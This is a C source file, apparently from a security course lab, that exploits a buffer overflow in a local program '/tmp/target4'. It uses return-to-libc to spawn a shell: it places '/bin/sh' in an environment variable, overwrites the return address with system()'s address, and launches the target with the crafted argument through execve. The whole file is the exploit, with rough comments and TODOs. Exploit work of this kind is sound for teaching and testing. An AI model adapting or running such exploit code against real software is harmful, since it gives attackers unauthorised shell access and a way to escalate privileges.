#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3]; 
  char *env[2];

  // set an environment variable
  int success = setenv("SHELLCODE", "/bin/sh", 0);
  char* env_ptr = getenv("SHELLCODE");
  printf("Shellcode environment variable address: %p; success: %d\n", getenv("SHELLCODE"), success);
  printf("Env ptr: 0x%x, %p\n", env_ptr, env_ptr);

  char buffer[20]; // target4 takes size of 4, plus 3 bytes of fluff will get us to the ebp and eip
  char randon[] = "SEXY";
  // buffer[0] = 0; // address of system (ebp?)
  // buffer[1] = 0; // address of exit (eip?)
  // buffer[2] = 0; // address of "bin/sh"
  // EBP: Random
  // EIP: System
  // EIP + 4: Dummy return
  // EIP + 8: Shell address
  memset(buffer, 0x90, 8); // overwrite EBP also
  memcpy(buffer+8, system_addr, 4); // system address goes in EIP
  // memcpy(buffer+8, exit_addr, 4); // TODO: Exit necessary?
  // memcpy(buffer+8, random, 4); // Random stuff
  memset(buffer+12, 'A', 4); // dummy return address
  memcpy(buffer+16, shell_addr, 4); // shell address

  args[0] = TARGET;
  args[1] = buffer; 
  args[2] = NULL;
  
  env[0] = env_ptr;
  env[1] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

